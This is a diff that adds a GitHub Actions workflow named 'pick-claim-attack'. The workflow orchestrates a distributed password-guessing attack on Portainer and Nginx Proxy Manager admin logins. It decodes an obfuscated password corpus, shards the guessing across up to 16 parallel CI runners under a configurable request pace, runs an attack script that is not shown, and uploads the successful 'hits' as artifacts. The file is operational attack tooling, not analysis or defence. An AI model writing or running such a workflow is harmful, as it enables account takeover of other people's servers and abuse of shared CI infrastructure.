@@ -1,0 +1,69 @@
+name: pick-claim-attack
+on:
+  workflow_dispatch:
+    inputs:
+      mode:
+        description: "probe | pt | npm"
+        required: true
+        default: "probe"
+      shard_list:
+        description: "JSON array of shard ids"
+        required: false
+        default: '[0]'
+      shards:
+        description: "total shards"
+        required: false
+        default: '1'
+      pace:
+        description: "seconds between requests (rate-based limiter)"
+        required: false
+        default: '1.0'
+      minlen:
+        description: "min corpus password length"
+        required: false
+        default: '12'
+      pt_users:
+        description: "Portainer usernames csv"
+        required: false
+        default: 'admin'
+      npm_identities:
+        description: "NPM identities csv"
+        required: false
+        default: 'admin@example.com'
+jobs:
+  attack:
+    runs-on: ubuntu-latest
+    timeout-minutes: 90
+    strategy:
+      fail-fast: false
+      max-parallel: 16
+      matrix:
+        shard: ${{ fromJSON(github.event.inputs.shard_list) }}
+    steps:
+      - uses: actions/checkout@v4
+      - name: deps
+        run: python3 -m pip install --quiet requests >/dev/null 2>&1 || true
+      - name: decode corpus
+        run: |
+          if [ -f attack/corpus.b64 ]; then base64 -d attack/corpus.b64 | gunzip > attack/corpus.txt; fi
+          wc -l attack/corpus.txt
+      - name: run
+        env:
+          MODE: ${{ github.event.inputs.mode }}
+          SHARD: ${{ matrix.shard }}
+          SHARDS: ${{ github.event.inputs.shards }}
+          PACE: ${{ github.event.inputs.pace }}
+          MINLEN: ${{ github.event.inputs.minlen }}
+          PT_USERS: ${{ github.event.inputs.pt_users }}
+          NPM_IDENTITIES: ${{ github.event.inputs.npm_identities }}
+          CORPUS: attack/corpus.txt
+        run: |
+          echo "===== shard $SHARD / $SHARDS mode $MODE ====="
+          python3 attack/portainer_pick.py 2>&1 | tee out-${{ matrix.shard }}.txt
+      - name: upload hits
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: pt-hits-${{ matrix.shard }}
+          path: hits/
+          if-no-files-found: ignore
